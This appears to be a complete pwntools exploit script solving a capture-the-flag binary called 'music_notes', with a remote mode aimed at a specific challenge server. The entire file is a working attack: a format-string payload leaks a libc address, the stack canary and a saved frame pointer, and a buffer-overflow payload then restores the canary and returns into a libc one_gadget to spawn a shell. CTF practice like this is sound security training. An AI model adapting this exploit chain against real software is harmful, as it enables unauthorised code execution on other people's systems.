import pwn

elf = pwn.context.binary = pwn.ELF("./music_notes")
pwn.context.terminal = ['tmux', 'splitw', '-h']
if pwn.args.GDB:
    p = pwn.gdb.debug(elf.path, gdbscript="c\n")
    libc = pwn.ELF("/lib/x86_64-linux-gnu/libc.so.6")

elif pwn.args.REMOTE:
    p = pwn.remote("68.183.40.128", 31430)
    libc = pwn.ELF("./libc.so.6")

else:
    libc = pwn.ELF("/lib/x86_64-linux-gnu/libc.so.6")
    p = elf.process()


def letter_to_idx(letter):
    p.recvuntil(b":\n")
    option1 = p.recvline().decode()
    option2 = p.recvline().decode()
    if option1[3] == letter:
        return b'1'
    elif option2[3] == letter:
        return b'2'


p.sendlineafter(b">", letter_to_idx("D"))
p.sendlineafter(b">", letter_to_idx("B"))
p.sendlineafter(b">", letter_to_idx("A"))
p.sendlineafter(b">", letter_to_idx("G"))
p.sendlineafter(b">", letter_to_idx("D"))
pwn.pause()
fmtstr = b'%43$p.%41$p.%38$p.'
fmtstr += (98 - len(fmtstr))*b'A'
p.sendlineafter(b">", fmtstr)
p.recvuntil(b": ")
libc_leak = p.recvuntil(b".", drop=True)
libc_leak = int(libc_leak, 16)
libc.address = libc_leak - (libc.sym['__libc_start_main'] + 243)
pwn.log.success(f"LIBC_BASE_ADDRESS: {hex(libc.address)}")
canary = p.recvuntil(b".", drop=True)
canary = pwn.p64(int(canary, 16))
pwn.log.success(f'CANARY: {hex(pwn.u64(canary))}')
rbp = p.recvuntil(b".", drop=True)
rbp = int(rbp, 16)
pwn.log.success(f'RBP: {hex((rbp))}')
payload = b'\x00'*0x28
payload += canary
payload += b'\x00'*0x30
payload += pwn.p64(rbp)
one_gadget1 = 0x4f3d5 + libc.address
one_gadget2 = 0x4f432 + libc.address
one_gadget3 = 0x10a41c + libc.address
# one_gadget1 = 0xe6c7e + libc.address
# one_gadget2 = 0xe6c81 + libc.address
# one_gadget3 = 0xe6c84 + libc.address
payload += pwn.p64(one_gadget2)
# pwn.pause()
p.sendlineafter(b": ", payload)
p.interactive()
